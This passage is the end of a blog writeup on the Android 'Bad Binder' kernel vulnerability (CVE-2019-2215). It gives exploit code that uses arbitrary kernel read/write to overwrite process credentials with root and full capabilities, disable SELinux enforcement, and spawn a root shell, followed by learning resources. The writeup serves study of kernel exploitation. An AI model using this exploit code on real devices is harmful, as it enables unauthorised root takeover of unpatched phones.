    <span class="n">m_kbase</span>  <span class="o">=</span> <span class="n">nsproxy</span> <span class="o">-</span> <span class="n">NSPROXY_OFFSET_FROM_KBASE_TEXT</span><span class="p">;</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"kbase: 0x%lx"</span><span class="p">,</span> <span class="n">m_kbase</span><span class="p">);</span>
    <span class="n">m_selinux_enforcing</span> <span class="o">=</span> <span class="n">m_kbase</span> <span class="o">+</span> <span class="n">SELINUX_ENFORCING_OFFSET</span><span class="p">;</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"selinux_enforing addr: 0x%lx"</span><span class="p">,</span> <span class="n">m_selinux_enforcing</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="overriding-task_structcred-with-init_cred"><span class="mr-2">Overriding task_struct.cred with init_cred</span><a href="#overriding-task_structcred-with-init_cred" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="c1">// struct cred init_cred = {</span>
<span class="c1">//      .usage              = ATOMIC_INIT(4),</span>
<span class="c1">//      .uid                = GLOBAL_ROOT_UID,</span>
<span class="c1">//      .gid                = GLOBAL_ROOT_GID,</span>
<span class="c1">//      .suid               = GLOBAL_ROOT_UID,</span>
<span class="c1">//      .sgid               = GLOBAL_ROOT_GID,</span>
<span class="c1">//      .euid               = GLOBAL_ROOT_UID,</span>
<span class="c1">//      .egid               = GLOBAL_ROOT_GID,</span>
<span class="c1">//      .fsuid              = GLOBAL_ROOT_UID,</span>
<span class="c1">//      .fsgid              = GLOBAL_ROOT_GID,</span>
<span class="c1">//      .securebits         = SECUREBITS_DEFAULT,</span>
<span class="c1">//      .cap_inheritable    = CAP_EMPTY_SET,</span>
<span class="c1">//      .cap_permitted      = CAP_FULL_SET,</span>
<span class="c1">//      .cap_effective      = CAP_FULL_SET,</span>
<span class="c1">//      .cap_bset           = CAP_FULL_SET,</span>
<span class="c1">//      .user               = INIT_USER,</span>
<span class="c1">//      .user_ns            = &amp;init_user_ns,</span>
<span class="c1">//      .group_info         = &amp;init_groups,</span>
<span class="c1">// };</span>
<span class="kt">void</span> <span class="n">BadBinder</span><span class="o">::</span><span class="n">override_cred_with_init_cred</span><span class="p">()</span>
<span class="p">{</span>

    <span class="n">info</span><span class="p">(</span><span class="s">"Overriding cred with init_cred"</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">cur_cred_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">m_task_struct_ptr</span><span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span><span class="p">,</span> <span class="n">cred</span><span class="p">);</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">task_struct: 0x%lx"</span><span class="p">,</span> <span class="n">m_task_struct_ptr</span><span class="p">);</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">cred_offset: 0x%lx"</span><span class="p">,</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span><span class="p">,</span> <span class="n">cred</span><span class="p">));</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">cred: 0x%lx"</span><span class="p">,</span> <span class="n">cur_cred_ptr</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">cur_cred</span> <span class="o">=</span> <span class="n">read_u64</span><span class="p">(</span><span class="n">cur_cred_ptr</span><span class="p">);</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">cur_cred: 0x%lx"</span><span class="p">,</span> <span class="n">cur_cred</span><span class="p">);</span>

    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">uid</span><span class="p">),</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">gid</span><span class="p">),</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">suid</span><span class="p">),</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">sgid</span><span class="p">),</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">euid</span><span class="p">),</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">egid</span><span class="p">),</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">fsuid</span><span class="p">),</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">fsgid</span><span class="p">),</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">securebits</span><span class="p">),</span> <span class="n">SECUREBITS_DEFAULT</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">cap_inheritable</span><span class="p">),</span> <span class="n">CAP_EMPTY_SET</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">cap_permitted</span><span class="p">),</span> <span class="n">CAP_FULL_SET</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">cap_effective</span><span class="p">),</span> <span class="n">CAP_FULL_SET</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">cap_bset</span><span class="p">),</span> <span class="n">CAP_FULL_SET</span><span class="p">);</span>
    <span class="n">write_u64</span><span class="p">(</span><span class="n">cur_cred</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cred</span><span class="p">,</span> <span class="n">cap_ambient</span><span class="p">),</span> <span class="n">CAP_EMPTY_SET</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Since we have <code class="language-plaintext highlighter-rouge">arb r/w</code> just imitate <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code>.</p><h3 id="disable-selinux_enforcing"><span class="mr-2">Disable selinux_enforcing</span><a href="#disable-selinux_enforcing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="n">BadBinder</span><span class="o">::</span><span class="n">override_selinux_enforcing</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"Overriding selinux_enforcing"</span><span class="p">);</span>
    <span class="n">write_u32</span><span class="p">(</span><span class="n">m_selinux_enforcing</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>To disable <code class="language-plaintext highlighter-rouge">selinux</code>, we just disable it by writing 0 to <code class="language-plaintext highlighter-rouge">selinux_enforcing</code> which is <code class="language-plaintext highlighter-rouge">uint32_t</code></p><h3 id="spawn-shell"><span class="mr-2">Spawn Shell</span><a href="#spawn-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="n">BadBinder</span><span class="o">::</span><span class="n">spawn_shell</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"Spawning shell"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Spawn shell on same process and we should have root as well as disabled selinux!</p><p><a href="/assets/img/2023-05-27-16-45-43.png" class="popup img-link "><img data-src="/assets/img/2023-05-27-16-45-43.png" alt="" class="lazyload" data-proofer-ignore></a> <a href="/assets/img/2023-05-27-16-45-53.png" class="popup img-link "><img data-src="/assets/img/2023-05-27-16-45-53.png" alt="" class="lazyload" data-proofer-ignore></a></p><h2 id="closing-statement"><span class="mr-2">Closing Statement</span><a href="#closing-statement" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This was my first introduction to Android Kernel Exploitation. Before this, I have done some Linux Kernel exploitation and it seems pretty similar to it except with less kernel structure I can call which makes it harder. Also big shout out to <code class="language-plaintext highlighter-rouge">HackSysTeam</code>. With their workshop I realize how visualization and neat code organization can make you understand how exploitation works way easier.</p><h2 id="resources"><span class="mr-2">Resources</span><a href="#resources" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="bad-binder"><span class="mr-2">Bad Binder</span><a href="#bad-binder" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">Google Project Zero Writeup</a><li><a href="https://cloudfuzz.github.io/android-kernel-exploitation/">HackSysTeam Bad Binder Explotation Workshop</a></ul><h3 id="vector-io"><span class="mr-2">Vector I/O</span><a href="#vector-io" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><a href="https://youtu.be/U2qvK1hJ6zg">AoE Unconventional UaF</a></ul><h3 id="arm-mitigations"><span class="mr-2">Arm Mitigations</span><a href="#arm-mitigations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="uao-and-pan"><span class="mr-2">UAO and PAN</span><a href="#uao-and-pan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li>https://duasynt.com/blog/android-uao-kernel-expl-mitigation</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/android-kernel/'>android_kernel</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/nday/" class="post-tag no-text-decoration" >nday</a> <a href="/tags/iovec/" class="post-tag no-text-decoration" >iovec</a> <a href="/tags/addr-limit/" class="post-tag no-text-decoration" >addr_limit</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=CVE-2019-2215%20Bad%20Binder%20Writeup%20-%20biazo&url=https%3A%2F%2Fvtl0.com%2Fposts%2Fbad_binder%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=CVE-2019-2215%20Bad%20Binder%20Writeup%20-%20biazo&u=https%3A%2F%2Fvtl0.com%2Fposts%2Fbad_binder%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=CVE-2019-2215%20Bad%20Binder%20Writeup%20-%20biazo&url=https%3A%2F%2Fvtl0.com%2Fposts%2Fbad_binder%2F" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/bnvr/">Using Binary Ninja for Vulnerability Research</a><li><a href="/posts/umdctf-2022/">UMDCTF 2022</a><li><a href="/posts/libafl-tuple-list/">LibAFL Tuple List</a><li><a href="/posts/building-pixel7/">Building Pixel 7 AOSP and Android Kernel</a><li><a href="/posts/cve-2020-27786/">CVE-2020-27786 FUSE UaF</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/setup/">setup</a> <a class="post-tag" href="/tags/nday/">nday</a> <a class="post-tag" href="/tags/addr-limit/">addr_limit</a> <a class="post-tag" href="/tags/binja/">binja</a> <a class="post-tag" href="/tags/fuse/">fuse</a> <a class="post-tag" href="/tags/iovec/">iovec</a> <a class="post-tag" href="/tags/kcov/">kcov</a> <a class="post-tag" href="/tags/libafl/">libafl</a> <a class="post-tag" href="/tags/modprobe-path/">modprobe_path</a> <a class="post-tag" href="/tags/msg-msg/">msg_msg</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/cve-2020-27786/"><div class="card-body"> <em class="small" data-ts="1682481600" data-df="ll" > Apr 26, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CVE-2020-27786 FUSE UaF</h3><div class="text-muted small"><p> Overview I was looking for nday that I can use to learn more about FUSE since userfaultfd technique is dead in lastest kernel :(. My good friend c0ld21 was porting kiks PoC of CVE-2020-27786 which...</p></div></div></a></div><div class="card"> <a href="/posts/srsran-4g-setup/"><div class="card-body"> <em class="small" data-ts="1684728000" data-df="ll" > May 22, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>srsRan 4G Setup</h3><div class="text-muted small"><p> Hardware BladeRfMicro A4 sysmocom sim Card reader Omnikey CardMan or MCR3512 Software Ubuntu 22.04 VMware Workstation Install Ubuntu in VMware change usb setting USB Compatibili...</p></div></div></a></div><div class="card"> <a href="/posts/loadable_kernel_modules/"><div class="card-body"> <em class="small" data-ts="1683518400" data-df="ll" > May 8, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Loadable Kernel Modules</h3><div class="text-muted small"><p> Overview Whether you are fuzzing or looking into certain Linux subsystems, you might need to set up a loadable kernel module if you selected m option on kernel config. An example would be somethin...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/srsran-4g-setup/" class="btn btn-outline-primary" prompt="Older"><p>srsRan 4G Setup</p></a><div class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></div></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "elbiazo/elbiazo.github.io", "data-repo-id": "R_kgDOGNShDQ", "data-category": "Comments", "data-category-id": "DIC_kwDOGNShDc4CWFIx", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/setup/">setup</a> <a class="post-tag" href="/tags/nday/">nday</a> <a class="post-tag" href="/tags/addr-limit/">addr_limit</a> <a class="post-tag" href="/tags/binja/">binja</a> <a class="post-tag" href="/tags/fuse/">fuse</a> <a class="post-tag" href="/tags/iovec/">iovec</a> <a class="post-tag" href="/tags/kcov/">kcov</a> <a class="post-tag" href="/tags/libafl/">libafl</a> <a class="post-tag" href="/tags/modprobe-path/">modprobe_path</a> <a class="post-tag" href="/tags/msg-msg/">msg_msg</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/elbiazo">biazo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/mermaid@9.2.2/dist/mermaid.min.js"></script> <script> (function () { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE ? "dark" : "default"); let config = {theme: expectedTheme}; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function () { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Create mermaid tag */ $("pre").has("code.language-mermaid").each(function () { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<pre class=\"mermaid\">${svgCode}</pre>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); })(); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1.11.6/dayjs.min.js,npm/dayjs@1.11.6/locale/en.min.js,npm/dayjs@1.11.6/plugin/relativeTime.min.js,npm/dayjs@1.11.6/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-8KV7H7QQDE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-8KV7H7QQDE'); }); </script>
